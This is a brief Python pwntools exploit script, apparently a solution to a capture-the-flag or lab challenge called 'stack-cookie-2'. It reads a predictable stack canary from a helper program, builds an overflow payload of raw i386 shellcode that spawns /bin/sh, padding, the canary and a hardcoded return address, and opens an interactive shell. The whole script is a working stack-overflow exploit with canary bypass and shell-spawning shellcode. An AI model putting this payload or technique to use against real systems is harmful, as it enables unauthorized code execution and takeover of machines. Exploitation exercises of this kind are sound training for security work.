#!/usr/bin/env python

from pwn import *
import os

p = process('./rand')
data = p.readline()
rand = int(data)
print(rand)

p = process('./stack-cookie-2')

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

#buf = shellcode + "A"*(0x84 - len(shellcode)) + p32(rand) + "AAAA"*2
#if not os.path.exists('core'):
 #   p.sendline(buf)
  #  p.wait()
#c = Core('./core')

#buf_addr = c.stack.find(buf)
#print(hex(buf_addr))
buf_addr = 0xffffd470

string = shellcode + "A"*(0x84 - len(shellcode)) + p32(rand) + "AAAA" + p32(buf_addr)

p.sendline(string)
p.interactive()
